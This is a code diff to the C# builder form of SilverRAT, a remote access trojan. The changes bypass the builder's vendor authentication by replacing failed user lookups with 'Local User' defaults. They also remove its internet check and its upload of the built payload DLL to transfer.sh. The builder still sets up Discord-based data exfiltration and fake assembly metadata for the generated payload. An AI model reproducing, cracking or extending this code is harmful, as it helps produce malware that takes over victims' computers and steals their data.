@@ -925,14 +925,6 @@ public class FormSilver : Form
         }
         await Methods.FadeIn(this, 5);
         Trans = true;
-        try
-        {
-            Console.WriteLine("Welcome : " + Logger.auth_sample.user_data.username);
-        }
-        catch
-        {
-            Close();
-        }
     }
 
     private void FormSilver_Shown(object sender, EventArgs e)
@@ -1136,28 +1128,28 @@ public class FormSilver : Form
 
             try
             {
-                ProfileUsername.Text = Logger.auth_sample.user_data.username.ToString();
-                LevelProfile.Value = Convert.ToInt32(Logger.auth_sample.user_data.level);
+                string profileUser = !string.IsNullOrEmpty(Logger.auth_sample.user_data.username) ? Logger.auth_sample.user_data.username : "Local User";
+                ProfileUsername.Text = profileUser;
+                if (!int.TryParse(Logger.auth_sample.user_data.level, out int profileLevel))
+                {
+                    profileLevel = 0;
+                }
+                LevelProfile.Value = profileLevel;
                 ProfileDate.Text = "Liftime";
                 ProfileDate.ForeColor = Color.Green;
-                if (ClientsList.SelectedRows.Count == 0)
-                {
-                    //	ProfileDate.Text = "Liftime";
-                    //	ProfileDate.ForeColor = Color.Green;
-                }
-                else
-                {
-                    //	ProfileDate.Text = Logger.auth_sample.user_data.expires.ToString();
-                    //	ProfileDate.ForeColor = Color.Black;
-                }
-                bunifuLabel_2.Text = "ID - " + Logger.auth_sample.user_data.id + "Silver_RAT";
+                bunifuLabel_2.Text = "ID - " + (Logger.auth_sample.user_data.id != 0 ? Logger.auth_sample.user_data.id.ToString() : "Local") + "Silver_RAT";
+                LeavelDashboard.Value = profileLevel;
             }
             catch
             {
-                Close();
+                ProfileUsername.Text = "Local User";
+                LevelProfile.Value = 0;
+                ProfileDate.Text = "Liftime";
+                ProfileDate.ForeColor = Color.Green;
+                bunifuLabel_2.Text = "ID - LocalSilver_RAT";
+                LeavelDashboard.Value = 0;
             }
             MesgWelcome.Text = "Welcome Back, " + ProfileUsername.Text;
-            LeavelDashboard.Value = Convert.ToInt32(Logger.auth_sample.user_data.level);
         }
         catch (Exception ex2)
         {
@@ -1419,23 +1411,37 @@ public class FormSilver : Form
             TitleMuneProfile.Text = "Profile";
             try
             {
-                ProfileUsername.Text = Logger.auth_sample.user_data.username.ToString();
-                LevelProfile.Value = Convert.ToInt32(Logger.auth_sample.user_data.level);
-                if (Logger.auth_sample.user_data.expires.ToString().Contains("2030"))
+                string profileUser = !string.IsNullOrEmpty(Logger.auth_sample.user_data.username) ? Logger.auth_sample.user_data.username : "Local User";
+                ProfileUsername.Text = profileUser;
+                if (!int.TryParse(Logger.auth_sample.user_data.level, out int profileLevel))
+                {
+                    profileLevel = 0;
+                }
+                LevelProfile.Value = profileLevel;
+                if (!string.IsNullOrEmpty(Logger.auth_sample.user_data.expires) && Logger.auth_sample.user_data.expires.Contains("2030"))
                 {
                     ProfileDate.Text = "Liftime";
                     ProfileDate.ForeColor = Color.Green;
                 }
-                else
+                else if (!string.IsNullOrEmpty(Logger.auth_sample.user_data.expires))
                 {
                     ProfileDate.Text = Logger.auth_sample.user_data.expires.ToString();
                     ProfileDate.ForeColor = Color.Black;
                 }
-                bunifuLabel_2.Text = "ID - " + Logger.auth_sample.user_data.id + "@Silver";
+                else
+                {
+                    ProfileDate.Text = "Liftime";
+                    ProfileDate.ForeColor = Color.Green;
+                }
+                bunifuLabel_2.Text = "ID - " + (Logger.auth_sample.user_data.id != 0 ? Logger.auth_sample.user_data.id.ToString() : "Local") + "@Silver";
             }
             catch
             {
-                Close();
+                ProfileUsername.Text = "Local User";
+                LevelProfile.Value = 0;
+                ProfileDate.Text = "Liftime";
+                ProfileDate.ForeColor = Color.Green;
+                bunifuLabel_2.Text = "ID - Local@Silver";
             }
             ImageProfileMune.Image = GetLogo(ProfileUsername.Text);
             if ((int)performanceCounter1.NextValue() > 60)
@@ -2647,11 +2653,6 @@ public class FormSilver : Form
     {
         try
         {
-            if (!Methods.InternetState())
-            {
-                MessageBox.Show(this, "Please check internet connection!", "SilverRAT | Builder!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
-                return;
-            }
             Settings.ServerCertificate = new X509Certificate2(Settings.CertificatePath);
             string text = BuilderKey.Text;
             new Aes256(text);
@@ -2749,7 +2750,7 @@ public class FormSilver : Form
             if (EnabledDiscord.Checked)
             {
                 stringb.Replace("IsDiscordNotif", "true");
-                stringb.Replace("%HeyMesg%", Logger.auth_sample.user_data.username);
+                stringb.Replace("%HeyMesg%", "SilverRAT");
                 stringb.Replace("%ServerDiscord%", Encrypt.EncryptTxt(bunifuTextBox_0.Text, "0x49,0x76,0x61,10,0x20,0x4D,0x65,100,0x76,0x65,100,0x65,0x76"));
 
                 if (EnabledRecoveryData.Checked)
@@ -2845,23 +2846,12 @@ public class FormSilver : Form
         {
             if (File.Exists(OutputDll))
             {
-                Invoke((MethodInvoker)delegate
-                {
-                    UrlAV = Methods.AsyncUpload(OutputDll);
-                });
                 try
                 {
-                    if (File.Exists(OutputDll))
-                    {
-                        File.Delete(OutputDll);
-                    }
+                    File.Delete(OutputDll);
                 }
                 catch
                 {
-                }
-                if (!UrlAV.Contains("https://transfer.sh/"))
-                {
-                    return false;
                 }
                 return true;
             }
@@ -2877,32 +2867,23 @@ public class FormSilver : Form
     {
         try
         {
-            if (UploadClient())
+            StateAV = true;
+            stringb.Replace("%Setup%", StupSetup);
+            stringb.Replace("%Program%", StupProgram);
+            stringb.Replace("%Invoki%", StupMain);
+            if (BuilderAssemblyinformation.Checked)
             {
-                StateAV = true;
-
-                stringb.Replace("%Setup%", StupSetup);
-                stringb.Replace("%Program%", StupProgram);
-                stringb.Replace("%Invoki%", StupMain);
-                if (BuilderAssemblyinformation.Checked)
-                {
-                    stringb.Replace("DefAssembly", "true");
-                    stringb.Replace("%Title%", BuilderTitleAssembly.Text);
-                    stringb.Replace("%Description%", BuilderDescriptionsAssembly.Text);
-                    stringb.Replace("%Company%", BuilderCompanyAssembly.Text);
-                    stringb.Replace("%Product%", BuilderCompanyAssembly.Text);
-                    stringb.Replace("%Copyright%", BuilderCopyrightAssembly.Text);
-                    stringb.Replace("%Trademark%", BuilderTrademarksAssembly.Text);
-                    stringb.Replace("%v1%", Vr1.Text);
-                    stringb.Replace("%v2%", Vr2.Text);
-                    stringb.Replace("%v3%", Vr3.Text);
-                    stringb.Replace("%v4%", Vr4.Text);
-                }
-                StateAV = true;
-            }
-            else
-            {
-                StateAV = false;
+                stringb.Replace("DefAssembly", "true");
+                stringb.Replace("%Title%", BuilderTitleAssembly.Text);
+                stringb.Replace("%Description%", BuilderDescriptionsAssembly.Text);
+                stringb.Replace("%Company%", BuilderCompanyAssembly.Text);
+                stringb.Replace("%Product%", BuilderCompanyAssembly.Text);
+                stringb.Replace("%Copyright%", BuilderCopyrightAssembly.Text);
+                stringb.Replace("%Trademark%", BuilderTrademarksAssembly.Text);
+                stringb.Replace("%v1%", Vr1.Text);
+                stringb.Replace("%v2%", Vr2.Text);
+                stringb.Replace("%v3%", Vr3.Text);
+                stringb.Replace("%v4%", Vr4.Text);
             }
         }
         catch
